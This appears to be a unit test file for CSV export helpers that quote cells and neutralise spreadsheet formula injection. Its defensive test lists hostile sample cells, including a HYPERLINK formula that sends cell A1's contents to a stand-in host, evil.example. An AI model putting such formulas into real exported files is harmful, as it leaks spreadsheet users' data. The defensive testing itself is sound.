import { csvCell, csvRow } from './csv';

describe('csv helpers', () => {
  it('quotes ordinary text and doubles inner quotes', () => {
    expect(csvCell('Ali "the" buyer')).toBe('"Ali ""the"" buyer"');
  });

  it('keeps ordinary numbers, dates and Arabic text as they are', () => {
    expect(csvCell(42)).toBe('"42"');
    expect(csvCell('محمد')).toBe('"محمد"');
    expect(csvCell('2026-11-02 10:00')).toBe('"2026-11-02 10:00"');
  });

  it('defuses every formula trigger with a leading apostrophe', () => {
    for (const evil of ['=HYPERLINK("https://evil.example/?x="&A1,"Click")', '+1+1', '-2+3', '@SUM(1+1)', '\t=1', '\r=1']) {
      const cell = csvCell(evil);
      expect(cell.startsWith(`"'`)).toBeTrue();
    }
  });

  it('leaves phone numbers and plain numbers readable', () => {
    expect(csvCell('+963 944 123 456')).toBe('"+963 944 123 456"');
    expect(csvCell('-12.5')).toBe('"-12.5"');
    expect(csvCell('+1+A1')).toBe(`"'+1+A1"`);
  });

  it('does not touch a "+" or "-" that is not first, nor a leading phone plus inside text', () => {
    expect(csvCell('a=b')).toBe('"a=b"');
    expect(csvCell('x-ray')).toBe('"x-ray"');
  });

  it('treats null and undefined as empty', () => {
    expect(csvRow([null, undefined, 'a'])).toBe('"","","a"');
  });
});
